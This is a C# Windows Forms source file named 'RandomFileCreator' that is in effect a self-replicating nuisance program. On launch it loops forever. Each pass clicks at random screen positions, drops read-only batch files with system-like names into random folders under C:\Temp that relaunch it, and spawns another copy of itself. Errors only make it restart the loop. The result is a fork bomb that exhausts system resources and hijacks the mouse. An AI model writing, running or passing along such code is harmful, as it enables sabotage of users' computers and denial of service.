using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RandomFileCreator
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);

        public static int MOUSEEVENTF_LEFTDOWN = 0x02;
        public static int MOUSEEVENTF_LEFTUP = 0x04;
        public static int MOUSEEVENTF_RIGHTDOWN = 0x08;
        public static int MOUSEEVENTF_RIGHTUP = 0x10;

        public static Random random = new Random();
        public static string appPath = System.Reflection.Assembly.GetEntryAssembly().Location;
        public static string startPath = "C:\\Temp";
        public static int screenWidth = 1920;
        public static int screenHeight = 1080;

        public Form1()
        {
            Run(startPath);
        }

        public static void Run(object path2)
        {
            try
            {
                while (true)
                {
                    string path = RandomPath((string)path2) + "\\" + "System_App_" + RandomName() + ".bat";

                    Cursor.Position = new Point(random.Next(0, screenWidth), random.Next(0, screenHeight));
                    DoDoubleMouseClick();

                    using (StreamWriter sw = new StreamWriter(path, true))
                    {
                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.ReadOnly);
                        sw.Write("start " + appPath);
                    }
                    Process.Start(appPath);
                }
            }
            catch (Exception)
            {
                Run((string)path2);
                return;
            }
        }

        public static void DoDoubleMouseClick()
        {
            int x = Cursor.Position.X;
            int y = Cursor.Position.Y;
            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, x, y, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, x, y, 0, 0);
        }

        public static string RandomPath(string path)
        {
            try
            {
                string[] names = Directory.GetDirectories(path);
                if (names.Length == 0 || random.Next(0, 2) == 0)
                {
                    return path;
                }
                int rand = random.Next(0, names.Length - 1);
                return RandomPath(names[rand]);
            }
            catch (UnauthorizedAccessException)
            {
                return path;
            }
        }

        public static string RandomName(string str = "")
        {
            if (str.Length == 18)
            {
                return str;
            }
            int rand = random.Next(1, 3) == 1 ? random.Next(48, 57) : random.Next(97, 122);
            return RandomName(str + ((char)rand));
        }
    }
}
